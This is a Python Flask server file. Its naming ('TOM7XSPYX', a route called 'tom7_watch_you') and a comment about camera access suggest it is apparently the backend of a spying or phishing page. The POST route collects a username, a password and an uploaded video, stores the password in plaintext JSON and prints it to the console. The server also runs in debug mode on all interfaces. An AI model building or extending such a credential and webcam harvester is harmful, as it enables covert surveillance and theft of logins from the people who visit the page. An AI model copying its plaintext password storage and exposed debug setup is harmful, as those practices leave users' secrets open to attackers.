from flask import Flask, request, jsonify, render_template
import os
import json
from werkzeug.utils import secure_filename

# Use os.path.join for platform-independent paths
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
UPLOADS_FOLDER = os.path.join(BASE_DIR, 'UPLOADS')
TEMPLATES_FOLDER = os.path.join(BASE_DIR, 'TOM7XNET')

# Configure Flask application with custom template folder
app = Flask(__name__, template_folder=TEMPLATES_FOLDER)

# Ensure the UPLOADS directory exists
if not os.path.exists(UPLOADS_FOLDER):
    os.makedirs(UPLOADS_FOLDER)

# Set the path for the JSON file and the upload folder
JSON_FILE = os.path.join(UPLOADS_FOLDER, 'users.json')
app.config['UPLOAD_FOLDER'] = UPLOADS_FOLDER

def load_users():
    """Loads user data from the JSON file. Returns an empty dictionary if the file doesn't exist or is broken."""
    if os.path.exists(JSON_FILE):
        with open(JSON_FILE, 'r') as f:
            try:
                return json.load(f)
            except json.JSONDecodeError:
                return {}
    return {}

def save_users(users):
    """Saves user data to the JSON file."""
    with open(JSON_FILE, 'w') as f:
        json.dump(users, f, indent=4)

@app.route('/')
def home():
    """Renders the main HTML page from the TOM7XNET folder."""
    return render_template('TOM7XSPYX.html')

@app.route('/tom7_watch_you', methods=['POST'])
def tom7_watch_you():
    """Handles both login data and video file upload in a single request."""
    try:
        username = request.form.get('username')
        password = request.form.get('password')
        video_file = request.files.get('video')

        print("DEBUG incoming:", username, password, video_file)  # debug log

        if not username or not password or not video_file:
            return jsonify({'error': 'Username, password, and video are required'}), 400

        # Handle login data
        users = load_users()
        if username in users:
            return jsonify({'error': 'Username already exists'}), 409

        users[username] = {'password': password}
        save_users(users)

        # Handle video file upload
        if video_file.filename == '':
            return jsonify({'error': 'Video file is not valid'}), 400

        filename = f'{username}_{secure_filename(video_file.filename)}'
        file_path = os.path.join(app.config['UPLOAD_FOLDER'], filename)

        video_file.save(file_path)

        return jsonify({
            'message': 'Login successful and video uploaded',
            'username': username,
            'video_filename': filename
        }), 200

    except Exception as e:
        print("ERROR in /tom7_watch_you:", str(e))  # tampilkan error di console
        return jsonify({'error': f'Internal server error: {str(e)}'}), 500

if __name__ == '__main__':
    # Run Flask on localhost, which is considered a secure context by browsers
    # This allows camera access for local development.
    app.run(host='0.0.0.0', port=5000, debug=True)